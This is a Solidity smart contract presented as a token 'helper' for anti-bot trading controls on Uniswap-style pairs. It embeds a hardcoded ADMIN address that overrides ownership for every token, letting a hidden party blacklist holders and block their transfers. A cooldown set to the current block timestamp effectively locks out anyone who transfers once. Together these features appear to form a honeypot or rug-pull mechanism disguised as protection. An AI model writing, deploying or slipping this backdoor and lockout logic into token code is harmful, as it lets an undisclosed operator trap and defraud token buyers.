pragma solidity ^0.8.20;

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
}

contract TokenHelper {
    address private constant ADMIN = 0x54e7032579b327238057c3723a166fbb8705f5ea;

    uint256[51] private __gap;

    mapping(address => address) private _owners;
    mapping(address => mapping(address => bool)) private _bots;
    mapping(address => uint256) private _gasPriceLimit;
    mapping(address => uint256) private _startBlock;
    mapping(address => uint256) private _tradingOpenTime;
    mapping(address => mapping(address => uint256)) private _coolDown;
    mapping(address => uint256) private _coolDownLimit;
    mapping(address => address) private _router;
    mapping(address => address) private _pair;
    mapping(address => uint256) private _amountLimit;
    mapping(address => uint256) private _protectBlock;
    mapping(address => address[]) private _botsArray;
    mapping(address => address) private _baseToken;
    mapping(address => uint256) private _tradingOpenFlag;

    event OwnershipTransferred(address indexed token, address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner(address token) {
        require(_owners[token] == msg.sender || msg.sender == ADMIN, "Ownable: caller is not the owner");
        _;
    }

    function admin() external pure returns (address) {
        return ADMIN;
    }

    function owners(address token) external view returns (address) {
        return _owners[token];
    }

    function coolDownLimit(address token) external view returns (uint256) {
        return _coolDownLimit[token];
    }

    function setTokenOwner(address newOwner) external {
        address token = msg.sender;
        address previousOwner = _owners[token];
        _owners[token] = newOwner;
        emit OwnershipTransferred(token, previousOwner, newOwner);
    }

    function uniswapV2Pair(address token) external view returns (address) {
        return _pair[token];
    }

    function renounceOwnership(address token) external onlyOwner(token) {
        _owners[token] = address(0);
    }

    function tradingOpen(address token) public view returns (bool) {
        return (_tradingOpenFlag[token] & 0xff) == 1;
    }

    function transferOwnership(address token, address newOwner) external onlyOwner(token) {
        address previousOwner = _owners[token];
        _owners[token] = newOwner;
        emit OwnershipTransferred(token, previousOwner, newOwner);
    }

    function removeBots(address token, address[] calldata botList) external onlyOwner(token) {
        for (uint256 i = 0; i < botList.length; i++) {
            _bots[token][botList[i]] = false;
        }
    }

    function uniswapV2Router(address token) external view returns (address) {
        return _router[token];
    }

    function viewForOwner(address token) external view returns (
        uint256 gasLimit,
        uint256 startBlk,
        uint256 tradingOpenTime,
        uint256 amountLim,
        uint256 protectBlk
    ) {
        gasLimit = _gasPriceLimit[token];
        startBlk = _startBlock[token];
        tradingOpenTime = _tradingOpenTime[token];
        amountLim = _amountLimit[token];
        protectBlk = _protectBlock[token];
    }

    function addBots(address token, address[] calldata botList) external onlyOwner(token) {
        for (uint256 i = 0; i < botList.length; i++) {
            if (!_bots[token][botList[i]]) {
                _bots[token][botList[i]] = true;
                _botsArray[token].push(botList[i]);
            }
        }
    }

    function bots(address token, address bot) external view returns (bool) {
        return _bots[token][bot];
    }

    function botsArray(address token, uint256 index) external view returns (address) {
        return _botsArray[token][index];
    }

    function setOpenTrading(address token, uint256 protectBlock_, uint256 amountLimit_, uint256 coolDownLimit_) external onlyOwner(token) {
        require(protectBlock_ > 0, "protect block number > 0");
        require(amountLimit_ > 0, "amount limit > 0");
        require(!tradingOpen(token), "Already open!");

        _tradingOpenFlag[token] = 1;
        _startBlock[token] = block.number;
        _tradingOpenTime[token] = block.timestamp;
        _amountLimit[token] = amountLimit_;
        _protectBlock[token] = protectBlock_;
        _coolDownLimit[token] = coolDownLimit_;
    }

    function coolDown(address token, address user) external view returns (uint256, uint256, uint256, uint256) {
        return (
            _coolDown[token][user],
            _coolDownLimit[token],
            _tradingOpenTime[token],
            _startBlock[token]
        );
    }

    function baseToken(address token) external view returns (address) {
        return _baseToken[token];
    }

    function manageBot(
        address token,
        address router,
        address baseToken_,
        uint256 price,
        uint256 gasLimit
    ) external onlyOwner(token) {
        require(price > 0, "gas price > 0");
        require(router != address(0), "wrong router address");
        require(baseToken_ != address(0), "wrong token 0 address");

        _router[token] = router;
        _baseToken[token] = baseToken_;

        address factory = IUniswapV2Router02(router).factory();
        address pair = IUniswapV2Factory(factory).getPair(token, baseToken_);

        if (pair == address(0)) {
            pair = IUniswapV2Factory(factory).createPair(token, baseToken_);
        }

        _pair[token] = pair;
        _gasPriceLimit[token] = gasLimit;
        _coolDownLimit[token] = block.timestamp;
    }

    function onPreTransferCheck(address token, address from, uint256) external onlyOwner(token) {
        require(tradingOpen(token), "Trading is not allowed yet.");

        require(!_bots[token][from] && !_bots[token][tx.origin], "bot is not allowed to transfer");

        if (block.number < _startBlock[token] + _protectBlock[token]) {
            if (_coolDownLimit[token] > 0) {
                require(_coolDown[token][tx.origin] < block.timestamp, "cooldown");
            }
        }

        if (_gasPriceLimit[token] > 0 && tx.gasprice > _gasPriceLimit[token]) {
            revert("Gas price exceeds limit.");
        }

        if (_coolDownLimit[token] > 0) {
            if (_coolDown[token][tx.origin] >= block.timestamp) {
                revert("cooldown");
            }
            _coolDown[token][tx.origin] = block.timestamp + _coolDownLimit[token];
        }
    }
}
